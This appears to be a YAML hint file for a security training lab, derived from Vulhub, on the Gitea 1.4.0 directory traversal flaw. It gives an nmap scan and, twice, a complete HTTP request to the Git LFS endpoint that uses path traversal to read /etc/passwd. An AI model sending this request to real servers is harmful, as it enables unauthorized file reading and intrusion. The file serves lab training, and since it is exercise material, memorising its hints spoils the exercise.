# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
schema_version: 1
match: gitea/1.4-rce
hint_levels:
  low:
  - Inspect the gitea service or application on {{NODE_NAME}} @ {{NODE_IP}}.
  medium:
  - |-
    Catalog TCP ports: 3000,20022. Identify the exposed services:

    ```bash
    nmap -Pn -sT -sV -p 3000,20022 {{NODE_IP}}
    ```
  - 'Catalog port mappings (published → container): web: 3000/tcp → container 3000/tcp; web: 20022/tcp → container
    22/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.'
  - 'Documented target URL(s): `http://{{NODE_IP}}:3000`, `http://{{NODE_IP}}:3000/vulhub/repo.git/info/lfs/objects/......`.'
  high:
  - 'Vulnerability: Gitea 1.4.0 Directory Traversal Leading to Remote Command Execution.'
  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
    substitutions.
  - |-
    Vulnerability Reproduction

    Since the vulnerability chain is quite complex overall, we will only reproduce the file reading part. For the remaining exploitation methods, please refer to the second reference link.

    Open Gitea, find the public project you just created, such as `vulhub/repo`, and send the following data packet to add a Git LFS object:

    ```
    POST /vulhub/repo.git/info/lfs/objects HTTP/1.1
    Host: {{NODE_IP}}:3000
    Accept-Encoding: gzip, deflate
    Accept: application/vnd.git-lfs+json
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/json

    {
        "Oid": "....../../../etc/passwd",
        "Size": 1000000,
        "User" : "a",
        "Password" : "a",
        "Repo" : "a",
        "Authorization" : "a"
    }
    ```

    Then, visit `http://{{NODE_IP}}:3000/vulhub/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth`, and you can see that `/etc/passwd` has been successfully read:

    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/gitea/1.4-rce/2.png
  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/gitea/1.4-rce/README.md'
  - |-
    Additional public references:
    - https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html
    - https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html
access_instructions:
  title: Gitea 1.4.0 Directory Traversal Leading to Remote Command Execution
  steps:
  - title: Locate the target service
    instructions: |-
      Catalog TCP ports: 3000,20022. Identify the exposed services:

      ```bash
      nmap -Pn -sT -sV -p 3000,20022 {{NODE_IP}}
      ```

      Catalog port mappings (published → container): web: 3000/tcp → container 3000/tcp; web: 20022/tcp → container 22/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.

      Documented target URL(s): `http://{{NODE_IP}}:3000`, `http://{{NODE_IP}}:3000/vulhub/repo.git/info/lfs/objects/......`.
  - title: Vulnerability Reproduction
    instructions: |-
      Since the vulnerability chain is quite complex overall, we will only reproduce the file reading part. For the remaining exploitation methods, please refer to the second reference link.

      Open Gitea, find the public project you just created, such as `vulhub/repo`, and send the following data packet to add a Git LFS object:

      ```
      POST /vulhub/repo.git/info/lfs/objects HTTP/1.1
      Host: {{NODE_IP}}:3000
      Accept-Encoding: gzip, deflate
      Accept: application/vnd.git-lfs+json
      Accept-Language: en
      User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
      Connection: close
      Content-Type: application/json

      {
          "Oid": "....../../../etc/passwd",
          "Size": 1000000,
          "User" : "a",
          "Password" : "a",
          "Repo" : "a",
          "Authorization" : "a"
      }
      ```

      Then, visit `http://{{NODE_IP}}:3000/vulhub/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth`, and you can see that `/etc/passwd` has been successfully read:

      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/gitea/1.4-rce/2.png
